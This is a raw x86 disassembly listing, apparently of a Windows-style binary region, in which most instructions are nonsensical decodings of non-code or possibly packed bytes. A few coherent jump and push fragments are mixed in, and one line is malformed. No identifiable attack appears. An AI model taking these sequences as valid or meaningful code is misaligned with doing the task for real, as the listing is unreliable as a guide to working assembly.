  4090ad:	inc    esi
  4090ae:	cmp    BYTE PTR [edi],al
  4090b0:	inc    edx
  4090b1:	cmp    al,0xf4
  4090b3:	adc    cl,BYTE PTR [eax+0x8]
  4090b6:	repnz adc cl,al
  4090b9:	rcl    DWORD PTR [ebx-0xd8be698],1
  4090bf:	lods   eax,DWORD PTR ds:[esi]
  4090c0:	fmul   QWORD PTR [ebx-0x4e96a81]
  4090c6:	test   DWORD PTR ds:0x1fa9d16b,0x29e29914
  4090d0:	sub    edi,esp
  4090d2:	scas   eax,DWORD PTR es:[edi]
  4090d3:	inc    ebx
  4090d4:	imul   esi,DWORD PTR [ecx+0x95738a5],0x737c175a
  4090de:	cmp    ebx,DWORD PTR ds:0x5dff0509
  4090e4:	cmp    eax,0xe2aad382
  4090e9:	mov    eax,0xdbc5a1d8
  4090ee:	(bad)  
  4090ef:	retf   
  4090f0:	mov    ch,0x90
  4090f2:	dec    ebp
  4090f3:	cmp    ebx,edi
  4090f5:	xor    DWORD PTR [edx-0x29],ecx
  4090f8:	repnz jecxz 0x409168
  4090fb:	push   0x852da304
  409100:	mov    al,0x29
  409102:	mov    bh,0x56
  409104:	and    dl,BYTE PTR ds:[esi-0x30263aa8]
  40910b:	xor    ebp,ebx
  40910d:	pop    esi
  40910e:	push   esp
  40910f:	cli    
  409110:	sub    al,0x42
  409112:	push   ecx
  409113:	stc    
  409114:	(bad)  
  409116:	adc    BYTE PTR [edi],0xf7
  409119:	sub    esp,DWORD PTR [ecx+ebx*4-0x4a]
  40911d:	imul   ebx,DWORD PTR [ecx+0x30],0x67
  409121:	ds jge 0x4090ce
  409124:	dec    edx
  409125:	std    
  409126:	cdq    
  409127:	mov    ah,0x65
  409129:	in     al,0x96
  40912b:	idiv   BYTE PTR [edx-0x17]
  40912e:	clc    
  40912f:	jge    0x40911f
  409131:	add    cl,BYTE PTR [eax-0x1c]
  409134:	call   0x586f6e02
  409139:	or     dh,BYTE PTR [ecx]
  40913b:	or     al,cl
  40913d:	and    al,0x5b
  40913f:	test   DWORD PTR [esi-0x72466559],0x31e19293
  409149:	scas   eax,DWORD PTR es:[edi]
  40914a:	pop    esp
  40914b:	fadd   DWORD PTR [ebx]
  40914d:	mov    ecx,0x2b03cc37
  409152:	mov    eax,ds:0x3166205c
  409157:	mov    esi,0x19d1324a
  40915c:	cmc    
  40915d:	lods   al,BYTE PTR ds:[esi]
  40915e:	loop   0x40918f
  409160:	mov    ch,0x50
  409162:	(bad)  
  409163:	pop    eax
  409164:	push   edi
  409165:	mov    ah,0x32
  409167:	cwde   
  409168:	scas   al,BYTE PTR es:[edi]
  409169:	nop
  40916a:	and    eax,0x658d463e
  40916f:	or     eax,eax
  409171:	cli    
  409172:	lea    esp,[edx+eiz*8-0x21353a33]
  409179:	inc    ebp
  40917a:	push   edi
  40917b:	fs push es
  40917d:	jge    0x4091dd
  40917f:	jne    0x409141
  409181:	gs or  al,0xc6
  409184:	pop    ds
  409185:	mov    ds:0x9e7c9ad4,al
  40918a:	popa   
  40918b:	loop   0x40910e
  40918d:	sub    BYTE PTR [ebp+0x412c8e01],0x3e
  409194:	retf   
  409195:	(bad)  
  409197:	ret    0x8175
  40919a:	adc    ah,BYTE PTR [edi-0x4fa30548]
  4091a0:	mov    dh,0x69
  4091a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091a3:	mov    cl,0x20
  4091a5:	adc    DWORD PTR [ecx-0x23],edx
  4091a8:	je     0x40920b
  4091aa:	mov    cl,0xaf
  4091ac:	add    edx,DWORD PTR [edx+0x61]
  4091af:	mov    bl,0xaf
  4091b1:	nop
  4091b2:	fdivrp st(4),st
  4091b4:	aas    
  4091b5:	jns    0x409231
  4091b7:	push   edi
  4091b8:	mov    ch,0x51
  4091ba:	ja     0x4091ab
  4091bc:	test   al,0x8a
  4091be:	xor    DWORD PTR [eax+0x7d17f4d5],edx
  4091c4:	imul   ebp,DWORD PTR [ecx+0x435c44bf],0xffffff9e
  4091cb:	add    al,0x36
  4091cd:	dec    edi
  4091ce:	scas   eax,DWORD PTR es:[edi]
  4091cf:	cmp    edx,DWORD PTR [edi]
  4091d1:	std    
  4091d2:	in     al,dx
  4091d3:	std    
  4091d4:	cld    
  4091d5:	mov    DWORD PTR [edi],ebx
  4091d7:	push   ebp
  4091d8:	out    0x32,eax
  4091da:	mov    ecx,DWORD PTR ds:0xa86c444d
  4091e0:	jg     0x409210
  4091e2:	outs   dx,DWORD PTR ds:[esi]
  4091e3:	sub    BYTE PTR [edi+0x36],0x48
  4091e7:	add    edx,DWORD PTR [ebp-0xa]
  4091ea:	imul   ebp,DWORD PTR [esi],0x7d
  4091ed:	fwait
  4091ee:	mov    ebx,0xb13d962
  4091f3:	clc    
  4091f4:	(bad)  
  4091f5:	shl    BYTE PTR [esi+0x1f],0x18
  4091f9:	(bad)  
  4091fa:	xchg   ecx,eax
  4091fb:	sub    dl,BYTE PTR [ebx+0xa]
  4091fe:	test   DWORD PTR [edx-0x32],ebx
  409201:	mov    eax,ds:0x133222d2
  409206:	call   0xde38edfb
  40920b:	fsub   st,st(1)
  40920d:	push   ebx
  40920e:	mov    DWORD PTR [esi+0x5783caf7],ebp
  409214:	into   
  409215:	or     DWORD PTR [edx-0x1c],esi
  409218:	test   eax,0xfe945417
  40921d:	std    
  40921e:	sub    esi,eax
  409220:	or     al,BYTE PTR es:[ebx]
  409223:	fucomp st(5)
  409225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409226:	xchg   ebx,eax
  409227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409228:	enter  0xb3f,0xcb
  40922c:	js     0x409245
  40922e:	inc    eax
  40922f:	dec    ebp
  409230:	imul   esp,edi,0xe9b8d6ce
  409236:	push   ebx
  409237:	or     dh,ch
  409239:	fstp   QWORD PTR [ebx]
  40923b:	push   ebx
  40923c:	or     esi,DWORD PTR [eax+ebx*1]
  40923f:	inc    ebx
  409240:	xchg   edi,eax
  409241:	pop    eax
  409242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409243:	mov    ebp,0x6d3e6d55
  409248:	(bad)  
  409249:	call   0x1d70:0x56bb4a32
  409250:	mov    edi,0xd1ecbdf1
  409255:	sbb    eax,0xe8773d5c
  40925a:	stc    
  40925b:	js     0x4092bc
  40925d:	or     bh,cl
  40925f:	test   eax,0x3fbe0d6b
  409264:	push   edx
  409265:	pop    edx
  409266:	xchg   esp,eax
  409267:	ins    BYTE PTR es:[edi],dx
  409268:	mul    edi
  40926a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40926b:	sbb    al,0x80
  40926d:	cmc    
  40926e:	frstor [edi-0x3b]
  409272:	(bad)  
  409273:	fldcw  WORD PTR [edx-0x5082502e]
  409279:	outs   dx,DWORD PTR ds:[esi]
  40927a:	enter  0x674f,0x7f
  40927e:	pop    edi
  40927f:	mov    ebp,0x4aae0563
  409284:	les    ecx,FWORD PTR [ecx]
  409286:	(bad)  
  409287:	call   0x5944d8b1
  40928c:	hlt    
  40928d:	add    eax,0x80dc7032
  409292:	in     eax,dx
  409293:	sbb    DWORD PTR [esi*1-0x2d6a353f],ebp
  40929a:	hlt    
  40929b:	or     eax,0xf2ccd657
  4092a0:	ins    BYTE PTR es:[edi],dx
  4092a1:	push   0x16ae7e12
  4092a6:	xchg   DWORD PTR [esi],edi
  4092a8:	adc    BYTE PTR [edi+edx*8],cl
  4092ab:	stos   BYTE PTR es:[edi],al
  4092ac:	hlt    
  4092ad:	jg     0x40929f
  4092af:	in     al,dx
  4092b0:	js     0x409242
  4092b2:	mov    ebx,0xadf0fc4c
  4092b7:	ror    esi,0xeb
  4092ba:	fnsave [ebx+0x6b]
  4092bd:	mov    ch,0xf2
  4092bf:	sbb    esp,DWORD PTR [esi]
  4092c1:	mov    ah,0x5e
  4092c3:	(bad)  
  4092c4:	sub    esp,DWORD PTR [eax]
  4092c6:	ret    
  4092c7:	jns    0x409277
  4092c9:	lods   al,BYTE PTR ds:[esi]
  4092ca:	jp     0x4092b1
  4092cc:	mov    al,BYTE PTR [edx]
  4092ce:	call   0xd833:0x1aa5
  4092d4:	sub    DWORD PTR [ebp-0x7f],esp
  4092d7:	lahf   
  4092d8:	(bad)  
  4092db:	repnz retf 
  4092dd:	sbb    BYTE PTR [edi-0x1c1ca56b],bl
  4092e3:	gs add ax,0xc336
  4092e8:	add    esp,DWORD PTR [edx-0x54a6bb7]
  4092ee:	icebp  
  4092ef:	out    0xea,eax
  4092f1:	push   ds
  4092f2:	in     eax,dx
  4092f3:	sub    eax,0x4fa360b3
  4092f8:	or     BYTE PTR [ecx-0x19],al
  4092fb:	adc    ecx,DWORD PTR [ebx]
  4092fd:	jne    0x409302
  4092ff:	fnstenv [edx]
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	mov    dl,0xd8
  40932f:	pop    ecx
  409330:	push   ebx
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409353
  40933a:	cmp    DWORD PTR [edi-0x50],esi
  40933d:	xchg   ebp,eax
  40933e:	push   0xffffffe8
  409340:	mov    ah,0xd5
  409342:	popa   
  409343:	pusha  
  409344:	push   ebp
  409345:	cmp    eax,0xecd14145
  40934a:	je     0x409307
  40934c:	push   es
  40934d:	aaa    
  40934e:	cmp    al,0x6c
  409350:	leave  
  409351:	jo     0x40934c
  409353:	test   BYTE PTR [eax+0x14],dh
  409356:	mov    ds:0x1fe3d504,al
  40935b:	dec    ecx
  40935c:	lods   eax,DWORD PTR ds:[esi]
  40935d:	test   eax,0xeb937d01
  409362:	loopne 0x4092ef
  409364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409365:	fdivrp st(5),st
  409367:	pop    ss
  409368:	mul    DWORD PTR [esi+0x0]
  40936b:	out    dx,eax
  40936c:	sub    eax,ebx
  40936e:	adc    DWORD PTR [ebx+0x6dd3ca60],ebx
  409374:	pop    ebp
  409375:	(bad)  [ecx]
  409377:	cli    
  409378:	dec    edx
  409379:	cmp    ch,BYTE PTR [esi+0x2074eb19]
  40937f:	punpckhdq mm7,QWORD PTR ds:0xcb7d445
  409386:	lods   eax,DWORD PTR ds:[esi]
  409387:	(bad)  
  409388:	jno    0x4093e9
  40938a:	jne    0x40940a
  40938c:	test   al,0x43
  40938e:	mov    ds:0xdc6df9a2,eax
  409393:	bound  ebx,QWORD PTR [ebp+0x64cd7118]
  409399:	mov    edi,0xb24ab33e
  40939e:	push   ss
  40939f:	nop
  4093a0:	pop    ebp
  4093a1:	and    bh,BYTE PTR [ecx]
  4093a3:	(bad)  
  4093a5:	jmp    0x40932d
  4093a7:	in     al,0xd5
  4093a9:	cmp    BYTE PTR [edi],cl
  4093ab:	pop    ebx
  4093ac:	ret    
  4093ad:	shr    ecx,cl
  4093af:	or     eax,0xe182717b
  4093b4:	mov    ah,0xfd
  4093b6:	sbb    eax,0x3d420806
  4093bb:	or     eax,0xba2ab7f
  4093c0:	shl    ah,0x26
  4093c3:	addr16 pop ebp
  4093c5:	xchg   edx,eax
  4093c6:	not    BYTE PTR [ebx-0x6]
  4093c9:	inc    edi
  4093ca:	pop    ecx
  4093cb:	add    dl,cl
  4093cd:	int3   
  4093ce:	mov    edx,0x5fbdaf6c
  4093d3:	sbb    al,0xd9
  4093d5:	pushf  
  4093d6:	aam    0xad
  4093d8:	pop    ebx
  4093d9:	out    dx,eax
  4093da:	sahf   
  4093db:	icebp  
  4093dc:	out    0x58,eax
  4093de:	xor    DWORD PTR [edx+0x46],esi
  4093e1:	inc    eax
  4093e2:	ins    BYTE PTR es:[edi],dx
  4093e3:	out    0x4d,eax
  4093e5:	js     0x4093a6
  4093e7:	aas    
  4093e8:	icebp  
  4093e9:	lea    esi,[ecx+0xd5a8825]
  4093ef:	ds inc edi
  4093f1:	adc    cl,BYTE PTR [edi]
  4093f3:	push   cs
  4093f4:	add    eax,0xe092e434
  4093f9:	aas    
  4093fa:	imul   ecx,DWORD PTR [ebp-0x10],0x582feb53
  409401:	clc    
  409402:	nop
  409403:	dec    ebp
  409404:	xchg   esi,eax
  409405:	push   esp
  409406:	inc    edi
  409407:	sar    eax,cl
  409409:	mov    al,ds:0x610bc4f2
  40940e:	sbb    DWORD PTR [esi-0x40],0x5a5d4712
  409415:	jnp    0x4093c5
  409417:	out    dx,al
  409418:	mov    ds:0x62a6b2df,eax
  40941d:	stc    
  40941e:	out    dx,eax
  40941f:	mov    ebx,0xd015fb38
  409424:	in     eax,0x71
  409426:	dec    edi
  409427:	or     DWORD PTR [edi-0x3f],esi
  40942a:	push   0xae73b702
  40942f:	sub    BYTE PTR [edx+ebx*8],al
  409432:	cmp    ah,BYTE PTR [esi+edi*4+0x4814907c]
  409439:	scas   al,BYTE PTR es:[edi]
  40943a:	jl     0x409445
  40943c:	jl     0x4093bf
  40943e:	push   edx
  40943f:	jbe    0x40940e
  409441:	lea    eax,[eax-0x4b]
  409444:	xlat   BYTE PTR ds:[ebx]
  409445:	jmp    0x768ff95f
  40944a:	(bad)  
  40944b:	mov    eax,ds:0x28e9753
  409450:	pop    edi
  409451:	ins    BYTE PTR es:[edi],dx
  409452:	pushf  
  409453:	or     dh,BYTE PTR fs:[ebx]
  409456:	mov    eax,gs
  409458:	add    al,0x18
  40945a:	mov    WORD PTR ds:0xed7c448c,gs
  409460:	fs dec esp
  409462:	mov    esi,0x214f9ae6
  409467:	mov    ebx,0xccc0e5ab
  40946c:	rcr    BYTE PTR [eax+eiz*1],1
  40946f:	enter  0xba05,0x8a
  409473:	mov    esp,0xecece4e0
  409478:	pop    eax
  409479:	sbb    BYTE PTR [edi+0x70],dl
  40947c:	aad    0xb5
  40947e:	dec    ecx
  40947f:	jmp    0x4094ee
  409481:	push   cs
  409482:	in     al,0x99
  409484:	jge    0x409503
  409486:	jo     0x4094da
  409488:	outs   dx,BYTE PTR ds:[esi]
  409489:	nop
  40948a:	xchg   esp,eax
  40948c:	xor    esi,DWORD PTR [ebp+0x61779d6a]
  409492:	in     al,0xb2
  409494:	cmp    DWORD PTR [ebx-0x4b],eax
  409497:	push   edx
  409498:	test   eax,0x53125f93
  40949d:	aam    0x1b
  40949f:	dec    esi
  4094a0:	inc    eax
  4094a1:	mov    esp,0xee2535eb
  4094a6:	xor    dl,bh
  4094a8:	aaa    
  4094a9:	and    eax,0x72cdebc8
  4094ae:	shl    DWORD PTR [esi],0x1a
  4094b1:	fcom   QWORD PTR [ecx-0x44]
  4094b4:	ins    DWORD PTR es:[edi],dx
  4094b5:	cdq    
  4094b6:	add    al,BYTE PTR [esi-0xd]
  4094b9:	lahf   
  4094ba:	push   edx
  4094bb:	hlt    
  4094bc:	sbb    BYTE PTR [ebp-0x3],cl
  4094bf:	adc    DWORD PTR [ebp-0x3e],ebx
  4094c2:	jl     0x40948f
  4094c4:	and    BYTE PTR [edx+0x173f983b],bl
  4094ca:	xor    al,0x88
  4094cc:	mov    cl,0x24
  4094ce:	jbe    0x40948e
  4094d0:	fiadd  DWORD PTR [esi-0x6b2ed063]
  4094d6:	push   0xffffffec
  4094d8:	inc    edx
  4094d9:	mov    al,ds:0x762ab84d
  4094de:	inc    edx
  4094df:	out    0x8f,eax
  4094e1:	xor    ebx,DWORD PTR [ebx]
  4094e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e4:	pusha  
  4094e5:	jb     0x40949e
  4094e7:	jl     0x4094ca
  4094e9:	mov    dh,0x62
  4094eb:	in     al,dx
  4094ec:	inc    ecx
  4094ed:	and    DWORD PTR [ebp+0x54131634],0x70
  4094f4:	xor    BYTE PTR [eax-0x11404e38],bh
  4094fa:	sub    eax,0xf59d6e27
  4094ff:	jnp    0x40950b
  409501:	out    dx,al
  409502:	adc    eax,DWORD PTR [eax-0x82fc684]
  409508:	xchg   DWORD PTR [edx-0x36],eax
  40950b:	jo     0x409556
  40950d:	dec    edx
  40950e:	mov    ds:0xc649b465,eax
  409513:	jle    0x4094b4
  409515:	jle    0x40954a
  409517:	in     eax,0x11
  409519:	cmp    eax,0xba1494f
  40951e:	ins    BYTE PTR es:[edi],dx
  40951f:	retf   
  409520:	xchg   ebp,eax
  409521:	cdq    
  409522:	rep stos BYTE PTR es:[edi],al
  409524:	fist   WORD PTR [ecx]
  409526:	push   0x97dc0675
  40952b:	mov    ebx,ecx
  40952d:	xchg   BYTE PTR [esi-0x2],al
  409530:	test   eax,0x61fbe9f
  409535:	pop    eax
  409536:	xor    BYTE PTR [edx+0xfdcd06f],dh
  40953c:	sbb    ch,BYTE PTR [ebp-0x40]
  40953f:	mov    ebx,0x992cdcd2
  409544:	mov    al,ah
  409546:	push   ds
  409547:	push   0x31
  409549:	out    0x4e,al
  40954b:	jne    0x409529
  40954d:	(bad)  
  40954e:	fcomp  QWORD PTR [esi-0x28d6cfab]
  409554:	out    0xfb,al
  409556:	add    eax,DWORD PTR gs:[edx+0x5f1fb260]
  40955d:	test   eax,0x863c1b09
  409562:	mov    ch,0xea
  409564:	sub    BYTE PTR ss:[esp+edx*2+0x135ea75f],0xb0
  40956d:	rcl    esp,0x34
  409570:	and    al,0xe5
  409572:	shr    BYTE PTR [ecx-0x565b3ee0],cl
  409578:	xlat   BYTE PTR ds:[ebx]
  409579:	arpl   WORD PTR [ecx],cx
  40957b:	jl     0x40953b
  40957d:	jb     0x409573
  40957f:	adc    BYTE PTR [esi-0x6c],0x97
  409583:	gs mov esp,fs
  409586:	sbb    bh,BYTE PTR es:[ecx]
  409589:	retf   0xecfe
  40958c:	fst    DWORD PTR ss:[edi+eax*2]
  409590:	sub    edx,DWORD PTR [ebx+esi*1-0x334dbe52]
  409597:	jle    0x4095af
  409599:	or     ebp,DWORD PTR [ebx]
  40959b:	popa   
  40959c:	imul   eax,DWORD PTR [eax-0x5b],0xe4e319e8
  4095a3:	sub    BYTE PTR [ecx],0x1b
  4095a6:	sub    DWORD PTR [edi],edx
  4095a8:	pop    esp
  4095a9:	xor    ch,dh
  4095ab:	fnstcw WORD PTR [edi-0x5c]
  4095ae:	dec    ebp
  4095af:	add    DWORD PTR [eax-0x40fc3352],ebp
  4095b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b6:	inc    ecx
  4095b7:	mov    al,0x82
  4095b9:	je     0x40958a
  4095bb:	sahf   
  4095bc:	(bad)  
  4095bd:	cld    
  4095be:	xlat   BYTE PTR ds:[ebx]
  4095bf:	push   eax
  4095c0:	leave  
  4095c1:	xchg   esp,eax
  4095c2:	hlt    
  4095c3:	je     0x409634
  4095c5:	in     al,dx
  4095c6:	xor    BYTE PTR [edx+0x2b],al
  4095c9:	call   0x7ede:0x7dfb49c0
  4095d0:	scas   al,BYTE PTR es:[edi]
  4095d1:	cmp    bh,ch
  4095d3:	push   ebx
  4095d4:	add    al,0x72
  4095d6:	lahf   
  4095d7:	push   edx
  4095d8:	pop    es
  4095d9:	ror    ch,1
  4095db:	outs   dx,BYTE PTR ds:[esi]
  4095dc:	rol    BYTE PTR [ebp-0x1b],0x7b
  4095e0:	push   0xffffffae
  4095e2:	or     BYTE PTR [eax+0x1a690648],cl
  4095e8:	test   eax,0xd13626eb
  4095ed:	div    DWORD PTR [edx]
  4095ef:	int3   
  4095f0:	lods   eax,DWORD PTR ds:[esi]
  4095f1:	sbb    bl,ah
  4095f3:	cmp    eax,0xcdd8b61b
  4095f8:	das    
  4095f9:	mov    eax,0xa1053538
  4095fe:	sbb    BYTE PTR [ecx+0x60],bl
  409601:	scas   al,BYTE PTR es:[edi]
  409602:	stc    
  409603:	sbb    eax,0xa4ae79ec
  409608:	mov    cl,0x86
  40960a:	fs jmp 0x75001845
  409610:	fcmovnb st,st(3)
  409612:	mov    dh,BYTE PTR fs:[edx]
  409615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409616:	pop    ebx
  409617:	inc    ebp
  409618:	lock retf 0xa5b9
  40961c:	jb     0x40960b
  40961e:	jge    0x40969e
  409620:	push   ss
  409621:	pop    esi
  409622:	cmp    al,bl
  409624:	ss test esi,edi
  409627:	out    0x21,al
  409629:	xchg   esp,eax
  40962a:	push   es
  40962b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40962c:	cld    
  40962d:	fisub  WORD PTR [edi-0x70]
  409630:	loop   0x40961c
  409632:	and    al,0x45
  409634:	push   ecx
  409635:	lds    edi,FWORD PTR [esi]
  409637:	inc    eax
  409638:	jmp    0x40961d
  40963a:	aas    
  40963b:	xor    ebp,DWORD PTR [edi+0x50]
  40963e:	dec    esi
  40963f:	xor    dl,BYTE PTR [edi-0x60116ff9]
  409645:	icebp  
  409646:	xchg   esp,eax
  409647:	push   ss
  409648:	xor    DWORD PTR [ecx-0x74c979ae],ebx
  40964e:	imul   ebx,DWORD PTR [ebp+0x42a7dfa],0xffffffd4
  409655:	pcmpgtw mm1,QWORD PTR [edi]
  409658:	int3   
  409659:	into   
  40965a:	sub    esi,DWORD PTR [edi-0x36]
  40965d:	pusha  
  40965e:	cmp    bh,BYTE PTR ds:0x8352e074
  409664:	ins    BYTE PTR es:[edi],dx
  409665:	add    al,0xfa
  409667:	bound  ebx,QWORD PTR [edi]
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [esi+ebp*8+0x5e],ecx
  409689:	test   al,0xd7
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x409689
  409693:	pop    esp
  409694:	lock adc BYTE PTR [edi],ah
  409697:	jno    0x40965b
  409699:	pop    ecx
  40969a:	inc    eax
  40969b:	inc    esp
  40969c:	xchg   edx,eax
  40969d:	fld    QWORD PTR [edx]
  40969f:	pop    esi
  4096a0:	lahf   
  4096a1:	ds pop ss
  4096a3:	mov    dl,0x44
  4096a5:	dec    ebx
  4096a6:	jae    0x409664
  4096a8:	ins    BYTE PTR es:[edi],dx
  4096a9:	push   eax
  4096aa:	aaa    
  4096ab:	ins    BYTE PTR es:[edi],dx
  4096ac:	adc    BYTE PTR [edi-0xc],0x6f
  4096b0:	ficomp DWORD PTR [esi+0x37c9ac2b]
  4096b6:	stc    
  4096b7:	lods   al,BYTE PTR ds:[esi]
  4096b8:	mov    dh,0x2b
  4096ba:	pop    eax
  4096bb:	ins    BYTE PTR es:[edi],dx
  4096bc:	imul   esi,DWORD PTR [ecx],0xffffffa4
  4096bf:	test   eax,0xe74d660e
  4096c4:	or     DWORD PTR [eax],esi
  4096c6:	test   DWORD PTR [ebx+0x65108d40],esi
  4096cc:	sub    al,0x15
  4096ce:	push   0xffffffa5
  4096d0:	dec    ebx
  4096d1:	cmp    al,0xfb
  4096d3:	enter  0x2428,0x52
  4096d7:	out    dx,eax
  4096d8:	inc    ecx
  4096d9:	mov    ch,0xed
  4096db:	out    0xfd,al
  4096dd:	call   0x85a2aa2b
  4096e2:	push   eax
  4096e3:	repnz push esi
  4096e5:	das    
  4096e6:	loopne 0x409727
  4096e8:	push   ecx
  4096e9:	loope  0x409766
  4096eb:	inc    DWORD PTR [ebx+0x787469e2]
  4096f1:	mov    BYTE PTR [eax-0x50699634],cl
  4096f7:	push   eax
  4096f8:	and    edi,DWORD PTR [edi+edi*4]
  4096fb:	int3   
  4096fc:	pop    ebp
  4096fd:	pop    ecx
  4096fe:	push   esi
  4096ff:	std    
  409700:	stos   DWORD PTR es:[edi],eax
  409701:	sbb    dl,BYTE PTR [ebx-0x74]
  409704:	dec    ebp
  409705:	sbb    al,0xd1
  409707:	mov    ah,0x7e
  409709:	mov    ebp,0x7dba54f7
  40970e:	cmp    dh,BYTE PTR [ebp+0x9]
  409711:	inc    ebp
  409712:	inc    esp
  409713:	jl     0x4096e7
  409715:	mov    DWORD PTR [eax-0x3f],esp
  409718:	in     eax,dx
  409719:	sbb    eax,0xdae796db
  40971e:	das    
  40971f:	jb     0x409749
  409721:	jmp    0x409791
  409723:	out    0x40,eax
  409725:	push   cs
  409726:	adc    eax,DWORD PTR [esp+ebx*2]
  409729:	ret    
  40972a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40972b:	push   cs
  40972c:	push   esi
  40972d:	repz test eax,0x917a9bec
  409733:	or     dl,bl
  409735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409736:	aad    0xe5
  409738:	loopne 0x4097b2
  40973a:	xlat   BYTE PTR ds:[ebx]
  40973b:	sti    
  40973c:	retf   0x296b
  40973f:	xor    al,0xaf
  409741:	daa    
  409742:	xlat   BYTE PTR ds:[ebx]
  409743:	(bad)  
  409745:	(bad)  
  409746:	in     al,0x77
  409748:	push   edi
  409749:	enter  0xdf50,0xa5
  40974d:	push   ss
  40974e:	ror    DWORD PTR [ebx-0x69127d69],0x69
  409755:	out    dx,al
  409756:	adc    DWORD PTR [eax+0x53],0x813f119c
  40975d:	rcr    DWORD PTR [esi+0x3a],cl
  409760:	leave  
  409761:	fisttp DWORD PTR [ebx+0x59c7671b]
  409767:	pop    es
  409768:	leave  
  409769:	xchg   esi,eax
  40976a:	xchg   esp,eax
  40976b:	daa    
  40976c:	xor    eax,0x4d86bff2
  409771:	aaa    
  409772:	cmp    cl,BYTE PTR [edx]
  409774:	inc    eax
  409775:	bound  esp,QWORD PTR [edi+ebx*1-0x1cf79391]
  40977c:	retf   
  40977d:	imul   esp,DWORD PTR [ebx],0x6101d503
  409783:	inc    edi
  409784:	jmp    0x42b0d4e3
  409789:	mov    ah,0x3
  40978b:	or     DWORD PTR [ebp+ebx*4+0x4177c29a],esi
  409792:	mov    edx,0x559d9663
  409797:	rcr    DWORD PTR [eax+0x55],cl
  40979a:	int    0x79
  40979c:	xor    BYTE PTR [esi-0x5a],ah
  40979f:	jbe    0x409744
  4097a1:	sti    
  4097a2:	inc    ebp
  4097a3:	sub    DWORD PTR [ecx+0x630912c8],ebx
  4097a9:	add    eax,0x4aeddcaf
  4097ae:	leave  
  4097af:	into   
  4097b0:	lds    edi,FWORD PTR [ebp+0x1b6d7cfd]
  4097b6:	icebp  
  4097b7:	sub    al,0xec
  4097b9:	mov    cl,0xe0
  4097bb:	sub    ebx,esp
  4097bd:	out    dx,al
  4097be:	adc    ch,BYTE PTR gs:[ecx-0xe49d19a]
  4097c5:	cmc    
  4097c6:	stc    
  4097c7:	xlat   BYTE PTR ds:[ebx]
  4097c8:	inc    eax
  4097c9:	ss inc esi
  4097cb:	stc    
  4097cc:	stos   BYTE PTR es:[edi],al
  4097cd:	cli    
  4097ce:	mov    ecx,0x6fb77089
  4097d3:	push   esi
  4097d4:	cmc    
  4097d5:	xchg   esi,eax
  4097d6:	jmp    0x52b3bff
  4097db:	cli    
  4097dc:	xor    BYTE PTR [edx+ebp*1+0x78],dh
  4097e0:	cmp    al,0x5a
  4097e2:	ss pusha 
  4097e4:	sbb    al,BYTE PTR [ecx+0x197865bb]
  4097ea:	nop
  4097eb:	mov    esp,ebx
  4097ed:	pop    esi
  4097ee:	sub    al,0x4a
  4097f0:	pop    edi
  4097f1:	xor    esi,DWORD PTR [edi+0x3e2255aa]
  4097f7:	or     DWORD PTR [ebx],edx
  4097f9:	mov    esp,ebx
  4097fb:	sub    al,al
  4097fd:	cmp    al,0x49
  4097ff:	jle    0x40985a
  409801:	les    edi,FWORD PTR [esi]
  409803:	stc    
  409804:	outs   dx,BYTE PTR ds:[esi]
  409805:	lds    ebx,FWORD PTR [esi+0x4f]
  409808:	dec    edi
  409809:	pop    ds
  40980a:	cli    
  40980b:	test   eax,0x87b46b24
  409810:	pop    edx
  409811:	pop    ecx
  409812:	sti    
  409813:	mov    ecx,?
  409815:	or     DWORD PTR [edi],ecx
  409817:	push   esp
  409818:	jo     0x4097f6
  40981a:	add    ebp,DWORD PTR [ebx-0x54]
  40981d:	es push eax
  40981f:	pop    es
  409820:	imul   eax,DWORD PTR ds:[eax+0x23],0x67
  409825:	mov    al,ds:0x12c4309b
  40982a:	imul   edi,DWORD PTR [ecx+eiz*1],0xffffffdf
  40982e:	hlt    
  40982f:	dec    ebp
  409830:	mov    bh,0xe8
  409832:	and    eax,0x8801975e
  409837:	lods   al,BYTE PTR ds:[esi]
  409838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409839:	mov    edx,0x83707df6
  40983e:	jne    0x4097e9
  409840:	jp     0x40983f
  409842:	out    0xed,al
  409844:	call   0x294b722
  409849:	lock mov bh,0xfa
  40984c:	in     eax,dx
  40984d:	lea    ecx,[ebp+eiz*4-0x7e0eee4a]
  409854:	(bad)  
  409855:	jmp    0x70a001d4
  40985a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40985b:	stc    
  40985c:	xchg   ebx,eax
  40985d:	mov    edi,0x7219bab8
  409862:	mov    DWORD PTR ds:0x9545b2db,ecx
  409868:	mov    BYTE PTR [edi-0x5bd9d65e],dl
